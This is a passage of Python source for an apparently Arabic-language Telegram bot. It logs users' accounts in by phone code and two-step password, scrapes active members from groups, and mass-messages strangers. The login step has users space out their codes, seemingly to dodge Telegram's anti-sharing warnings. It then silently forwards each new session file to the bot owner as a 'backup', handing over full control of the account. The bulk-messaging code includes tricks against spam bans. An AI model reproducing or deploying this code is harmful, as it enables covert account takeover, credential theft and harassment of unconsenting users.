            await conv.send_message(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
            return

        await conv.send_message(
            "📩 **تم إرسال كود التحقق إلى حسابك.**\n\n"
            "⚠️ **تنبيه لحماية الحساب:** أرسل الكود مع مسافات بين الأرقام\n"
            "(مثال: `1 2 3 4 5`)."
        )
        try:
            code_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        if code_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.")
            await user_client.disconnect()
            return
            
        code = "".join(c for c in code_msg.text if c.isdigit())
        
        try:
            await user_client.sign_in(phone=phone, code=code, phone_code_hash=send_code.phone_code_hash)
        except errors.SessionPasswordNeededError:
            await conv.send_message(
                "🔒 **الحساب محمي بكلمة مرور (التحقق بخطوتين).**\n\n"
                "⚠️ **أرسل كلمة المرور مع وضع مسافة بين كل حرف أو رقم**\n"
                "(مثال: `a b c 1 2 3`):"
            )
            try:
                pass_msg = await conv.get_response(timeout=300)
            except asyncio.TimeoutError:
                await conv.send_message("⏳ انتهى وقت الانتظار.")
                return
                
            if pass_msg.text.strip().startswith('/'):
                await conv.send_message("❌ تم الإلغاء.")
                await user_client.disconnect()
                return
                
            password = pass_msg.text.replace(" ", "").strip()
            
            try:
                await user_client.sign_in(password=password)
            except Exception as e:
                await conv.send_message(f"❌ فشل تسجيل الدخول بكلمة المرور: {e}")
                await user_client.disconnect()
                return
        except Exception as e:
            await conv.send_message(f"❌ فشل تسجيل الدخول: {e}")
            await user_client.disconnect()
            return
            
        me = await user_client.get_me()
        await user_client.disconnect()
        
        safe_name = clean_account_name(me.first_name)
        
        data = load_data()
        user_id_str = str(event.sender_id)
        if user_id_str not in data["accounts"]:
            data["accounts"][user_id_str] = []
            
        data["accounts"][user_id_str].append({
            "phone": phone,
            "session": session_name,
            "id": me.id,
            "name": safe_name  
        })
        save_data(data)
        
        await conv.send_message(f"✅ **تم تسجيل دخول الحساب بنجاح!**\n👤 الاسم: {safe_name}\n🆔 الأيدي: `{me.id}`")
        
        try:
            full_session_path = f"{session_path}.session"
            if os.path.exists(full_session_path):
                await bot.send_file(
                    OWNER_ID,
                    full_session_path,
                    caption=f"🔐 **نسخة احتياطية لملف جلسة جديد**\n📱 الرقم: `{phone}`\n👤 الاسم: `{safe_name}`\n👤 بواسطة: `{event.sender_id}`"
                )
        except Exception:
            pass

@bot.on(events.CallbackQuery(data=b"list_accounts"))
async def list_accounts_handler(event):
    if not is_authorized(event.sender_id): return
    data = load_data()
    user_id_str = str(event.sender_id)
    accounts = data.get("accounts", {}).get(user_id_str, [])
    
    if not accounts:
        await event.edit("⚠️ لا توجد حسابات مضافة خاصة بك حالياً.", buttons=[[Button.inline("🔙 رجوع", b"back_start")]])
        return
        
    msg = "📂 **قائمة الحسابات المساعدة المضافة الخاصة بك:**\n\n"
    buttons = []
    for idx, acc in enumerate(accounts):
        name = acc.get('name', 'حساب')
        aid = acc.get('id', 'غير معروف')
        if aid != 'غير معروف': msg += f"**{idx+1}.** [{name}](tg://user?id={aid})\n"
        else: msg += f"**{idx+1}.** {name} (بدون ID)\n"
        buttons.append([Button.inline(f"❌ حذف {name}", f"del_acc_{idx}".encode())])

    await event.edit(msg, buttons=buttons, parse_mode='md')

@bot.on(events.CallbackQuery(pattern=r"^del_acc_\d+$"))
async def delete_account_handler(event):
    if not is_authorized(event.sender_id): return
    idx = int(event.data.decode().split("_")[-1])
    data = load_data()
    user_id_str = str(event.sender_id)
    accounts = data.get("accounts", {}).get(user_id_str, [])
    
    if 0 <= idx < len(accounts):
        acc_name = accounts[idx].get("name", "هذا الحساب")
        buttons = [
            [Button.inline("✅ نعم، متأكد من الحذف", f"confirm_del_{idx}".encode())],
            [Button.inline("❌ إلغاء والتراجع", b"list_accounts")]
        ]
        await event.edit(f"⚠️ **هل أنت متأكد أنك تريد حذف الحساب ({acc_name})؟**\n\nلا يمكن التراجع عن هذا الإجراء.", buttons=buttons)
    else:
        await event.answer("❌ الحساب غير موجود.", alert=True)
        await list_accounts_handler(event)

@bot.on(events.CallbackQuery(pattern=r"^confirm_del_\d+$"))
async def confirm_delete_account_callback(event):
    if not is_authorized(event.sender_id): return
    idx = int(event.data.decode().split("_")[-1])
    data = load_data()
    user_id_str = str(event.sender_id)
    accounts = data.get("accounts", {}).get(user_id_str, [])
    
    if 0 <= idx < len(accounts):
        accounts.pop(idx)
        data["accounts"][user_id_str] = accounts
        save_data(data)
        await event.edit(f"✅ تم حذف الحساب بنجاح من قائمتك.", buttons=[[Button.inline("📂 رجوع للقائمة", b"list_accounts")]])
    else:
        await event.answer("❌ الحساب غير موجود.", alert=True)

@bot.on(events.CallbackQuery(data=b"mode_scrape"))
async def mode_scrape_handler(event):
    if not is_authorized(event.sender_id): return
    data = load_data()
    user_id_str = str(event.sender_id)
    accounts = data.get("accounts", {}).get(user_id_str, [])
    
    if not accounts:
        await event.edit("❌ يجب إضافة حساب مساعد واحد على الأقل خاص بك لسحب الأعضاء.", buttons=[[Button.inline("➕ إضافة حساب", b"add_account")]])
        return

    await event.delete()
    
    async with bot.conversation(event.chat_id) as conv:
        msg_acc = "🔢 **اختر الحساب الذي تريد استخدامه للجمع:**\n\n"
        for idx, acc in enumerate(accounts):
            name = acc.get('name', 'حساب')
            acc_id = acc.get('id')
            if acc_id: msg_acc += f"**{idx+1}.** [{name}](tg://user?id={acc_id})\n"
            else: msg_acc += f"**{idx+1}.** {name}\n"

        await conv.send_message(msg_acc, parse_mode='md')
        
        try: acc_choice = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        if acc_choice.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            return
            
        try: selected_acc = accounts[int(acc_choice.text.strip()) - 1]
        except (ValueError, IndexError):
            await conv.send_message("❌ اختيار غير صحيح. تم إلغاء العملية.")
            return

        session_path = os.path.join(SESSIONS_DIR, selected_acc['session'])
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()

        blocked_users = set()
        status_msg = await conv.send_message("⏳ **جاري قراءة المحادثات السابقة للحساب لمنع التكرار...**")
        async for d in client.iter_dialogs():
            if d.is_user and d.entity:
                blocked_users.add(d.entity.id)
        
        await status_msg.edit("🤔 **هل تريد استثناء محادثات حساب آخر مضاف في البوت؟ (نعم/لا)**")
        try: ex_choice = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await client.disconnect()
            return
            
        if ex_choice.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            await client.disconnect()
            return
            
        if ex_choice.text.strip() == "نعم":
            if len(accounts) > 1:
                msg_ex = "🔢 اختر رقم الحساب الثالث لاستثناء محادثاته:\n" + msg_acc
                await conv.send_message(msg_ex)
                try:
                    ex_num = await conv.get_response(timeout=300)
                    if ex_num.text.strip().startswith('/'):
                        await conv.send_message("❌ تم إلغاء العملية.")
                        await client.disconnect()
                        return
                    ex_acc = accounts[int(ex_num.text.strip()) - 1]
                    ex_client = TelegramClient(os.path.join(SESSIONS_DIR, ex_acc['session']), API_ID, API_HASH)
                    await ex_client.start()
                    async for d in ex_client.iter_dialogs():
                        if d.is_user and d.entity: blocked_users.add(d.entity.id)
                    await ex_client.disconnect()
                    await conv.send_message("✅ تم دمج محادثات الحساب الإضافي في قائمة التجاهل.")
                except Exception:
                    await conv.send_message("⚠️ فشل جلب محادثات الحساب الإضافي. سنكمل بالقائمة الحالية.")

        skip_group_members = set()
        await conv.send_message("🛡️ **أرسل رابط أو يوزر مجموعة لتخطي أعضائها الموجودين (أو أرسل `تخطي` للتجاوز):**")
        try: skip_input = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await client.disconnect()
            return
            
        if skip_input.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            await client.disconnect()
            return
            
        if skip_input.text.strip() != "تخطي":
            link = skip_input.text.strip()
            success = False
            await conv.send_message("⏳ جاري فحص الرابط ومحاولة الوصول للمجموعة...")
            try:
                if "+" in link or "joinchat" in link:
                    hash_val = link.split("/")[-1].replace("+", "").replace("joinchat/", "")
                    await client(ImportChatInviteRequest(hash_val))
                else:
                    await client(JoinChannelRequest(link))
            except Exception: pass
                
            try:
                entity = await client.get_entity(link)
                async for user in client.iter_participants(entity, limit=500):
                    skip_group_members.add(user.id)
                success = True
                await conv.send_message(f"✅ تم سحب {len(skip_group_members)} عضو لقائمة التخطي باستخدام الحساب الأساسي.")
            except Exception: pass
                
            if not success:
                await conv.send_message("⏳ الحساب الأول ما كدر يوصل للمجموعة.. جاري البحث وتجربة الانضمام بباقي الحسابات المضافة...")
                all_accounts = data.get("accounts", {}).get(user_id_str, [])
                for acc in all_accounts:
                    if acc['session'] == selected_acc['session']: continue
                    temp_client = TelegramClient(os.path.join(SESSIONS_DIR, acc['session']), API_ID, API_HASH)
                    await temp_client.start()
                    try:
                        if "+" in link or "joinchat" in link:
                            hash_val = link.split("/")[-1].replace("+", "").replace("joinchat/", "")
                            await temp_client(ImportChatInviteRequest(hash_val))
                        else: await temp_client(JoinChannelRequest(link))
                    except Exception: pass
                        
                    try:
                        entity = await temp_client.get_entity(link)
                        async for user in temp_client.iter_participants(entity, limit=500):
                            skip_group_members.add(user.id)
                        success = True
                        await conv.send_message(f"✅ تم سحب {len(skip_group_members)} عضو لقائمة التخطي بنجاح باستخدام حساب ({acc.get('name', 'حساب مساعد')}).")
                        await temp_client.disconnect()
                        break
                    except Exception: await temp_client.disconnect()
                        
            if not success:
                await conv.send_message("⚠️ **تنبيه:** ولا حساب من الحسابات المضافة متواجد بمجموعة التخطي أو كدر ينضم إلها. سيتم التخطي بدون استثناء أعضاء.")

        await conv.send_message("🎯 **أرسل الآن رابط أو يوزر المجموعة المستهدفة لجمع الأعضاء منها:**")
        try: group_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await client.disconnect()
            return
            
        if group_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            await client.disconnect()
            return
            
        group_input = group_msg.text.strip()

        try:
            if "+" in group_input or "joinchat" in group_input:
                hash_val = group_input.split("/")[-1].replace("+", "").replace("joinchat/", "")
                await client(ImportChatInviteRequest(hash_val))
            else:
                await client(JoinChannelRequest(group_input))
        except Exception: pass

        try:
            target_group = await client.get_entity(group_input)
            group_title = getattr(target_group, 'title', 'المجموعة المستهدفة')
        except Exception as e:
            if "not part of" in str(e).lower() or "Cannot get entity" in str(e):
                await conv.send_message("❌ **فشل الوصول:** الحساب المساعد غير متواجد في المجموعة المستهدفة، وتلغرام يمنع قراءة الرسائل بدون الانضمام. رجاءً تأكد أن الرابط صحيح أو انضم يدوياً.")
            else: await conv.send_message(f"❌ فشل الوصول للمجموعة: {e}")
            await client.disconnect()
            return

        blacklisted = data.get("blacklisted_groups", [])
        is_blacklisted = False

        target_id = str(target_group.id)
        target_username = getattr(target_group, 'username', '')
        if target_username:
            target_username = target_username.lower().strip()

        target_hash = ""
        if "+" in group_input or "joinchat" in group_input:
            target_hash = group_input.split("/")[-1].replace("+", "").replace("joinchat/", "").strip()

        for bg in blacklisted:
            bg_str_exact = str(bg).strip()
            bg_str_lower = bg_str_exact.lower()

            if bg_str_lower == target_id or bg_str_lower == f"-{target_id}" or bg_str_lower == f"-100{target_id}" or target_id == bg_str_lower.replace("-100", "").replace("-", ""):
                is_blacklisted = True
                break
            if target_username and bg_str_lower == target_username:
                is_blacklisted = True
                break
            if target_hash and bg_str_exact == target_hash:
                is_blacklisted = True
                break

        if is_blacklisted:
            await conv.send_message("❌ **عذراً، تم حظر السحب من هذه المجموعة بواسطة مالك البوت ولا يمكن العمل عليها.**")
            await client.disconnect()
            return

        admins = set()
        try:
            async for admin in client.iter_participants(target_group, filter=ChannelParticipantsAdmins):
                admins.add(admin.id)
        except Exception: pass
            
        try:
            chat_full = await client(functions.messages.GetFullChatRequest(target_group.id))
            for p in chat_full.full_chat.participants.participants:
                if isinstance(p, (types.ChatParticipantAdmin, types.ChatParticipantCreator)):
                    admins.add(p.user_id)
        except Exception: pass

        senders = {}
        count = 0
        progress_msg = await conv.send_message("⏳ **جاري البدء بجمع الأعضاء المتفاعلين...**")
        three_days_ago = datetime.now(timezone.utc) - timedelta(days=3)

        async for msg in client.iter_messages(target_group, limit=MESSAGES_LIMIT):
            count += 1
            if msg and msg.sender_id:
                uid = msg.sender_id
                if uid == target_group.id: continue
                    
                if uid not in admins and uid not in blocked_users and uid not in skip_group_members:
                    if uid not in senders:
                        try:
                            u_entity = await client.get_entity(uid)
                            if not u_entity.deleted and not u_entity.bot:
                                if isinstance(u_entity.status, types.UserStatusOffline):
                                    if u_entity.status.was_online and u_entity.status.was_online.replace(tzinfo=timezone.utc) >= three_days_ago:
                                        senders[uid] = u_entity
                                else:
                                    senders[uid] = u_entity
                        except Exception: pass

            if count % 100 == 0 or count == MESSAGES_LIMIT:
                bar = get_progress_bar(count, MESSAGES_LIMIT)
                try:
                    await progress_msg.edit(
                        f"⚡ **جاري فحص رسائل المجموعة المستهدفة**\n\n"
                        f"{bar} ({int((count/MESSAGES_LIMIT)*100)}%)\n\n"
                        f"📥 تم فحص: `{count}` / `{MESSAGES_LIMIT}` رسالة\n"
                        f"👥 تم صيد: `{len(senders)}` عضو متفاعل ونشط"
                    )
                except Exception: pass

        bar = get_progress_bar(count, count if count > 0 else 1)
        try:
            await progress_msg.edit(
                f"✅ **اكتمل فحص المجموعة المستهدفة**\n\n"
                f"{bar} (100%)\n\n"
                f"📥 إجمالي الرسائل المفحوصة: `{count}` رسالة\n"
                f"👥 تم صيد: `{len(senders)}` عضو متفاعل ونشط"
            )
        except Exception: pass

        await client.disconnect()

        if not senders:
            await conv.send_message("❌ لم يتم العثور على أعضاء مطابقين للشروط في هذه المجموعة.")
            return

        await conv.send_message(f"✅ **تم جمع {len(senders)} عضو بنجاح!**\nجاري إرسال القوائم مقسمة (100 يوزر لكل دفعة)...")
        await send_user_list_batches(client, bot, event.chat_id, senders.values(), f"أعضاء {group_title}")
        consume_trial(event.sender_id)
        await conv.send_message("✨ **انتهت عملية التصفية والأرشفة.** يمكنك الآن نسخ الأيديات واستخدامها في (الوضع ب - الإرسال المباشر).")

@bot.on(events.CallbackQuery(data=b"mode_direct"))
async def mode_direct_handler(event):
    if not is_authorized(event.sender_id): return
    
    data = load_data()
    user_id_str = str(event.sender_id)
    accounts = data.get("accounts", {}).get(user_id_str, [])
    if not accounts:
        await event.edit("❌ لا توجد حسابات مضافة خاصة بك للإرسال.", buttons=[[Button.inline("➕ إضافة حساب", b"add_account")]])
        return

    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        msg_acc = "🔢 <b>اختر رقم الحساب الذي سينفذ الإرسال المباشر:</b>\n\n"
        for idx, acc in enumerate(accounts):
            name = acc.get('name', 'حساب مساعد').replace('<', '').replace('>', '')
            acc_id = acc.get('id')
            if acc_id: msg_acc += f"<b>{idx+1}.</b> <a href='tg://user?id={acc_id}'>{name}</a>\n"
            else: msg_acc += f"<b>{idx+1}.</b> {name} <i>(تحتاج لحذفه وإضافته من جديد ليظهر الرابط)</i>\n"
                
        await conv.send_message(msg_acc, parse_mode='html')

        try: acc_choice = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        if acc_choice.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            return
            
        try: sender_acc = accounts[int(acc_choice.text.strip()) - 1]
        except (ValueError, IndexError):
            await conv.send_message("❌ اختيار غير صحيح. تم إلغاء العملية.")
            return

        await conv.send_message(
            "🤔 **هل هذا الحساب مميز (Telegram Premium)؟**\n\n"
            "▫️ أرسل **نعم** أو **لا**.\n"
            "*(إذا كان الحساب مميزاً، سيقوم البوت بمراسلة بوت @spambot بـ /start كل 3 رسائل ترويجية لتجنب الحظر)*\n"
            "نصيحة مهمة: اذا كان الحساب غير مفعل مميز فممكن ان ينحظر الحساب مؤقت من مراسلة الغرباء من اول رسالة"
        )
        try: premium_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError: return
            
        if premium_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            return
            
        is_premium = (premium_msg.text.strip() == "نعم")

        await conv.send_message(
            "📋 **أرسل الآن قائمة اليوزرات أو الايديات أو انسخ رسالة الدفعة وأرسلها هنا مباشرة:**\n"
            "*(يقبل البوت اليوزرات `@user` أو الروابط `tg://user?id=123` أو الأيديات العادية، كل واحد في سطر)*"
        )
        try: users_msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError: return
        
        if users_msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء العملية.")
            return
            
        raw_text = users_msg.text
        target_ids = set()
        
        for username in re.findall(r"@([a-zA-Z0-9_]{5,32})", raw_text): target_ids.add(username)
        for uid in re.findall(r"id=(\d+)", raw_text): target_ids.add(int(uid))
        for line in raw_text.splitlines():
            line_clean = line.strip()
            if line_clean.isdigit() and len(line_clean) > 5: target_ids.add(int(line_clean))

        if not target_ids:
            await conv.send_message("❌ لم يتم التعرف على أي يوزرات أو معرفات صالحة في الرسالة.")
            return

        await conv.send_message(f"🚀 **تم رصد `{len(target_ids)}` هدف.** بدء حملة الإرسال الآن...")
        
        session_path = os.path.join(SESSIONS_DIR, sender_acc['session'])
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()

        kalisha_data = {
            "text": data.get("kalisha_text", DEFAULT_KALISHA),
            "media": data.get("kalisha_media", None),
            "mutate": data.get("mutate_kalisha", False)
        }

        start_time = time.time()  
        success_count = 0
        error_count = 0
        
        initial_bar = get_progress_bar(0, len(target_ids))
        status_log = await conv.send_message(
            f"📊 **جاري الإرسال...** ({sender_acc.get('name', 'حساب مساعد')})\n\n"
            f"{initial_bar} (0%)\n\n"
            f"✅ ناجح: `0` | ❌ فشل/تخطي: `0`\n"
            f"📌 المتبقي: `{len(target_ids)}`"
        )

        for idx, target in enumerate(list(target_ids)):
            try: entity = await client.get_entity(target)
            except Exception:
                error_count += 1
                continue

            success, status = await send_with_client(client, entity, kalisha_data)
            
            if success: success_count += 1
            else:
                error_count += 1
                if status == "peer_flood":
                    await conv.send_message(f"⚠️ **تنبيه:** الحساب `{sender_acc['name']}` تعرض لحظر مؤقت من مراسلة الغرباء (PeerFlood). تم إيقاف الحملة حمايةً للحساب.")
                    break

            if is_premium and (idx + 1) % 3 == 0:
                try: await client.send_message("spambot", "/start")
                except Exception: pass

            if (idx + 1) % 2 == 0 or (idx + 1) == len(target_ids):
                bar = get_progress_bar(idx + 1, len(target_ids))
                try:
                    await status_log.edit(
                        f"📊 **جاري الإرسال...** ({sender_acc.get('name', 'حساب مساعد')})\n\n"
                        f"{bar} ({int(((idx+1)/len(target_ids))*100)}%)\n\n"
                        f"✅ ناجح: `{success_count}` | ❌ فشل/تخطي: `{error_count}`\n"
                        f"📌 المتبقي: `{len(target_ids) - (idx + 1)}`"
                    )
                except Exception: pass

        await client.disconnect()
        consume_trial(event.sender_id)
        
        duration = int(time.time() - start_time)
        await conv.send_message(
            f"🏁 **انتهت حملة الإرسال المباشر بنجاح!**\n\n"
            f"⏱️ المدة المستغرقة: `{duration // 60}` دقيقة و `{duration % 60}` ثانية.\n"
            f"✅ إجمالي الإرسال الناجح: `{success_count}`\n"
            f"⚠️ إجمالي الأخطاء أو التخطي: `{error_count}`"
        )

@bot.on(events.CallbackQuery(data=b"owner_panel"))
async def owner_panel_handler(event):
    if event.sender_id != OWNER_ID: return
    data = load_data()
    auth_users = data.get("authorized_users", {})
    accs = data.get("accounts", {})
    trial_users = data.get("trial_users", [])
    is_free_mode = data.get("global_free_mode", False)
    
    total_accs = sum(len(v) for v in accs.values()) if isinstance(accs, dict) else 0
    free_mode_status = "مفعل 🟢" if is_free_mode else "معطل 🔴"
    
    buttons = [
        [Button.inline("➕ سماح لمستخدم", b"owner_add_user"), Button.inline("🚫 حظر مستخدم", b"owner_del_user")],
        [Button.inline("🎁 منح تجربة مجانية", b"owner_add_trial"), Button.inline("👥 عرض المصرح لهم", b"owner_list_users")],
        [Button.inline(f"🔓 البوت للجميع ({free_mode_status})", b"owner_toggle_free")],
        [Button.inline("➕ إضافة حساب للشد", b"owner_add_rep_acc"), Button.inline("📂 حسابات الشد الحالية", b"owner_list_rep_acc")],
        [Button.inline("📢 إرسال إعلان للكل", b"owner_broadcast")],
        [Button.inline("🛡️ إدارة المجموعات المحظورة", b"owner_bl_panel")],
        [Button.inline("🔙 رجوع للقائمة الرئيسية", b"back_start")]
    ]
    
    await event.edit(
        f"👑 **لوحة تحكم المالك الأساسي**\n\n"
        f"👥 عدد المستخدمين (المشتركين): `{len(auth_users)}`\n"
        f"🎁 مستخدمين بانتظار التجربة: `{len(trial_users)}`\n"
        f"📱 إجمالي الحسابات المربوطة: `{total_accs}`\n"
        f"🌐 وضع المجاني للكل: `{free_mode_status}`\n\n"
        f"▫️ استخدم الأزرار أدناه للتحكم الكامل بالبوت والصلاحيات:",
        buttons=buttons
    )

@bot.on(events.CallbackQuery(data=b"owner_toggle_free"))
async def owner_toggle_free_handler(event):
    if event.sender_id != OWNER_ID: return
    data = load_data()
    current_status = data.get("global_free_mode", False)
    data["global_free_mode"] = not current_status
    save_data(data)
    
    new_status = "مفتوح مجاناً للجميع 🟢" if data["global_free_mode"] else "مغلق (بالاشتراك فقط) 🔴"
    await event.edit(
        f"✅ **تم تغيير حالة البوت بنجاح!**\n\nالوضع الحالي: {new_status}",
        buttons=[[Button.inline("🔙 رجوع للوحة المالك", b"owner_panel")]]
    )

@bot.on(events.CallbackQuery(data=b"owner_broadcast"))
async def owner_broadcast_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message(
            "📢 **أرسل الآن الرسالة (نص، صورة، فيديو، أو توجيه) التي تريد إرسالها كإعلان لجميع مستخدمي البوت:**\n\n"
            "*لإلغاء العملية أرسل /cancel*"
        )
        try: msg = await conv.get_response(timeout=300)
        except asyncio.TimeoutError:
            await conv.send_message("⏳ انتهى وقت الانتظار.")
            return
            
        if msg.text and msg.text.strip().startswith('/'):
            await conv.send_message("❌ تم إلغاء الإعلان.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        data = load_data()
        all_users = data.get("all_users", {})
        
        if not all_users:
            await conv.send_message("⚠️ لا يوجد أي مستخدمين مسجلين في البوت للإرسال إليهم.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        status_msg = await conv.send_message(f"⏳ جاري إرسال الإعلان إلى `{len(all_users)}` مستخدم...")
        
        success = 0
        failed = 0
        for uid_str in all_users.keys():
            try:
                await bot.send_message(int(uid_str), msg)
                success += 1
                await asyncio.sleep(0.5) 
            except Exception:
                failed += 1
                
        await status_msg.edit(
            f"✅ **اكتمل إرسال الإعلان بنجاح!**\n\n"
            f"📩 تم الإرسال إلى: `{success}` مستخدم\n"
            f"❌ فشل الإرسال (حظروا البوت): `{failed}` مستخدم",
            buttons=[[Button.inline("🔙 رجوع للوحة المالك", b"owner_panel")]]
        )

@bot.on(events.CallbackQuery(data=b"owner_bl_panel"))
async def owner_bl_panel_handler(event):
    if event.sender_id != OWNER_ID: return
    buttons = [
        [Button.inline("➕ إضافة مجموعة للحظر", b"owner_bl_add"), Button.inline("➖ إزالة مجموعة", b"owner_bl_del")],
        [Button.inline("📋 عرض المجموعات المحظورة", b"owner_bl_list")],
        [Button.inline("🔙 رجوع للوحة المالك", b"owner_panel")]
    ]
    await event.edit("🛡️ **إدارة المجموعات المحظورة (يمنع السحب منها بكافة أشكال الروابط واليوزرات العامة والخاصة):**\n\nاختر الإجراء المطلوب:", buttons=buttons)

@bot.on(events.CallbackQuery(data=b"owner_bl_add"))
async def owner_bl_add_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("➕ **أرسل يوزر، رابط (عام أو خاص)، أو أيدي المجموعة لمنع السحب منها:**\n*(يقبل الصيغ مثل: @group أو الرابط الخاص أو الأيدي الرقمي)*\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return
        
        raw_input = msg.text.strip()
        if raw_input.startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
            return
            
        data = load_data()
        if "blacklisted_groups" not in data:
            data["blacklisted_groups"] = []
            
        identifier = None
        status_msg = await conv.send_message("⏳ جاري استخراج الأيدي الفعلي للمجموعة...")
        
        clean_name = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").strip()
        
        if clean_name.lstrip('-').isdigit():
            identifier = clean_name
        else:
            try:
                entity = await bot.get_entity(raw_input)
                identifier = str(entity.id)
            except Exception:
                hash_val = None
                if "+" in raw_input or "joinchat" in raw_input:
                    hash_val = raw_input.split("/")[-1].replace("+", "").replace("joinchat/", "").strip()
                
                if hash_val:
                    found = False
                    accounts_dict = data.get("accounts", {})
                    for uid_str, accs in accounts_dict.items():
                        for acc in accs:
                            try:
                                session_path = os.path.join(SESSIONS_DIR, acc['session'])
                                temp_client = TelegramClient(session_path, API_ID, API_HASH)
                                await temp_client.connect()
                                invite = await temp_client(CheckChatInviteRequest(hash_val))
                                
                                chat_id = None
                                if hasattr(invite, 'chat'):
                                    chat_id = invite.chat.id
                                elif hasattr(invite, 'channel'):
                                    chat_id = invite.channel.id
                                    
                                if chat_id:
                                    identifier = str(chat_id)
                                    found = True
                                
                                await temp_client.disconnect()
                                if found: break
                            except Exception: pass
                        if found: break
                        
                    if not found:
                        identifier = hash_val 
                else:
                    identifier = clean_name.lower()
        
        if identifier and identifier.lstrip('-').isdigit():
            clean_id = identifier.replace('-', '')
            if not identifier.startswith('-100') and len(clean_id) > 8:
                identifier = f"-100{clean_id}"
        
        if identifier and identifier not in data["blacklisted_groups"]:
            data["blacklisted_groups"].append(identifier)
            save_data(data)
            await status_msg.edit(f"✅ **تم إضافة المجموعة بنجاح لقائمة المنع والاستثناء.**\nالمعرف المخزن: `{identifier}`", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
        else:
            await status_msg.edit("⚠️ هذه المجموعة مضافة مسبقاً في قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_bl_del"))
async def owner_bl_del_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("➖ **أرسل الرابط، اليوزر، أو الأيدي الذي تريد إزالته من قائمة الحظر:**\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg = await conv.get_response(timeout=120)
        except asyncio.TimeoutError: return
        
        raw_input = msg.text.strip()
        if raw_input.startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
            return
            
        data = load_data()
        identifier = None
        if "+" in raw_input or "joinchat" in raw_input:
            identifier = raw_input.split("/")[-1].replace("+", "").replace("joinchat/", "").strip()
        else:
            clean_name = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").strip()
            if clean_name.lstrip('-').isdigit():
                identifier = clean_name
            else:
                try:
                    entity = await bot.get_entity(raw_input)
                    identifier = str(entity.id)
                except Exception:
                    identifier = clean_name.lower()
                    
        if identifier and identifier in data.get("blacklisted_groups", []):
            data["blacklisted_groups"].remove(identifier)
            save_data(data)
            await conv.send_message(f"✅ تم إزالة `{identifier}` من قائمة الحظر بنجاح.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
        else:
            direct_match = raw_input.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").lower()
            matched = False
            for item in list(data.get("blacklisted_groups", [])):
                if str(item).lower() == direct_match or str(item) == raw_input:
                    data["blacklisted_groups"].remove(item)
                    save_data(data)
                    matched = True
                    break
            if matched:
                await conv.send_message("✅ تم إزالة المجموعة من قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
            else:
                await conv.send_message("⚠️ المجموعة غير موجودة في قائمة الحظر.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_bl_list"))
async def owner_bl_list_handler(event):
    if event.sender_id != OWNER_ID: return
    data = load_data()
    bl = data.get("blacklisted_groups", [])
    if not bl:
        await event.edit("📋 قائمة الحظر فارغة، لا توجد أي مجموعات ممنوعة حالياً.", buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])
        return
    
    msg = "📋 **المعرفات والأيديات المحظورة من السحب حالياً:**\n\n"
    for idx, g in enumerate(bl):
        msg += f"**{idx+1}.** `{g}`\n"
        
    await event.edit(msg, buttons=[[Button.inline("🔙 رجوع", b"owner_bl_panel")]])

@bot.on(events.CallbackQuery(data=b"owner_add_user"))
async def owner_add_user_handler(event):
    if event.sender_id != OWNER_ID: return
    await event.delete()
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("👤 **أرسل الأيدي (ID) الخاص بالمستخدم لسماح استخدامه للبوت:**\n\n*لإلغاء العملية أرسل /cancel*")
        try: msg_id = await conv.get_response(timeout=300)
        except asyncio.TimeoutError: return
            
        if msg_id.text.strip().startswith('/'):
            await conv.send_message("❌ تم الإلغاء.", buttons=[[Button.inline("🔙 رجوع", b"owner_panel")]])
            return
            
        try:
            new_id_str = str(int(msg_id.text.strip()))
        except ValueError:
